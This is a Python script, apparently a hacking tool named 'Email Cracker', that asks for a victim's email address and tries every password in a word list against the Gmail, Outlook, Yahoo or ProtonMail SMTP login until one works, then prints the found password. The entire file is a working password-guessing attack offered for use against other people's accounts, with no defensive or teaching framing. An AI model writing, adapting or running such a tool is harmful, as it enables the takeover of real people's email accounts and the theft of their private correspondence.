import logging
import time
import smtplib
import os


class color:
    def __init__(self):
        self.END = '\033[0m'
        self.BOLD = '\033[1m'
        self.YELLOW = '\033[93m'


fa = color()

logo = fa.YELLOW + fa.BOLD + r'''
  _____ __  __    _    ___ _        ____ ____      _    ____ _  _______ ____
 | ____|  \/  |  / \  |_ _| |      / ___|  _ \    / \  / ___| |/ / ____|  _ \
 |  _| | |\/| | / _ \  | || |     | |   | |_) |  / _ \| |   | ' /|  _| | |_) |
 | |___| |  | |/ ___ \ | || |___  | |___|  _ <  / ___ \ |___| . \| |___|  _ <
 |_____|_|  |_/_/   \_\___|_____|  \____|_| \_\/_/   \_\____|_|\_\_____|_| \_\
                                                                         v1.0
Coded By : Anonymous
GitHub   : https://github.com/Anonymous
''' + fa.END

Prompt = fa.BOLD + "World is not safe:" + fa.END

print(logo)
print(Prompt)


class bcolors:
    OK = '\033[92m'
    FAIL = '\033[91m'
    BOLD = '\033[1m'
    ENDC = '\033[0m'
    UNDERLINE = '\033[4m'


logging.basicConfig(level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')


def connect_to_smtp_server(provider):
    retries = 5
    for i in range(retries):
        try:
            if provider == 'gmail.com':
                smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
            elif provider in ['hotmail.com', 'outlook.com']:
                smtpserver = smtplib.SMTP("smtp.office365.com", 587)
            elif provider == 'yahoo.com':
                smtpserver = smtplib.SMTP("smtp.mail.yahoo.com", 587)
            elif provider in ['protonmail.com', 'proton.me']:
                smtpserver = smtplib.SMTP("smtp.protonmail.ch", 587)
            else:
                raise ValueError("Unsupported email provider")

            smtpserver.ehlo()
            smtpserver.starttls()
            logging.info("SMTP connection established successfully.")
            return smtpserver
        except (smtplib.SMTPConnectError, smtplib.SMTPServerDisconnected) as e:
            logging.error(f"Attempt {i+1}/{retries} failed: {e}")
            time.sleep(5)  # Wait for 5 seconds before retrying
    raise Exception(
        "Failed to connect to the SMTP server after several attempts.")


print(bcolors.BOLD + "Email Cracker" + bcolors.ENDC)
print(bcolors.BOLD + "The tool will only work if security settings is set to less secure apps" + bcolors.ENDC)
print(bcolors.BOLD + "-------------------------------------------------------------------" + bcolors.ENDC)
print(bcolors.BOLD + "TRYING WITH PASSWORDS IN: passwords.txt" + bcolors.ENDC)

user = input("Enter The Victim's Email Address: ")
passwfile = "passwords.txt"
passwfile = open(passwfile, "r")

provider = user.split('@')[-1]

if provider == 'protonmail.com':
    proceed = input(
        "ProtonMail requires the ProtonMail Bridge application. Do you want to proceed? (y/n): ").strip().lower()
    if proceed != 'y':
        print("Exiting...")
        exit()

try:
    smtpserver = connect_to_smtp_server(provider)

    for password in passwfile:
        password = password.strip()
        try:
            smtpserver.login(user, password)
            print(bcolors.UNDERLINE + "Password Found: %s" %
                  password + bcolors.ENDC)
            break
        except smtplib.SMTPAuthenticationError:
            print(bcolors.FAIL + "Password Incorrect: %s" %
                  password + bcolors.ENDC)
        except smtplib.SMTPException as smtp_err:
            logging.error(f"SMTP error occurred: {smtp_err}")
        except Exception as e:
            logging.error(f"An unexpected error occurred: {e}")
finally:
    smtpserver.quit()
    logging.info("SMTP server connection closed.")
